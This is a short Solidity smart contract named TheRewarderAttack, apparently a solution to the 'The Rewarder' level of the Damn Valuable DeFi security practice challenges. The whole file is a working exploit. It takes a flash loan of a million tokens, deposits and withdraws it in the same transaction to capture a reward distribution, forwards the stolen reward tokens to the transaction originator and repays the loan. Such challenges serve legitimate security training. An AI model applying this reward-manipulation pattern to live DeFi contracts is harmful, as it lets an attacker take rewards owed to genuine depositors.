pragma solidity ^0.8.0;

import '../DamnValuableToken.sol';

interface ITheRewardPool{
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
}

interface IRewardToken{
    function transfer(address to, uint256 amount) external;
    function balanceOf(address owner) external view returns(uint256);
}

interface IFlashLoanerPool{
    function flashLoan(uint256 amount) external;
}

contract TheRewarderAttack{

    ITheRewardPool private pool;
    DamnValuableToken private liquidityToken;
    IRewardToken private rewardToken;


    constructor(ITheRewardPool newPool, DamnValuableToken newLiquidityToken, IRewardToken reward){
        pool = newPool;
        liquidityToken= newLiquidityToken;
        rewardToken = reward;
    }
    function attack(IFlashLoanerPool flash) external{
        liquidityToken.approve(address(pool), 1000000 ether);
        flash.flashLoan(1000000 ether);
    }

    function receiveFlashLoan(uint256 amount) external {
        pool.deposit(amount);
        pool.withdraw(amount);
        rewardToken.transfer(tx.origin, rewardToken.balanceOf(address(this)));
        liquidityToken.transfer(msg.sender, amount);
    }   
}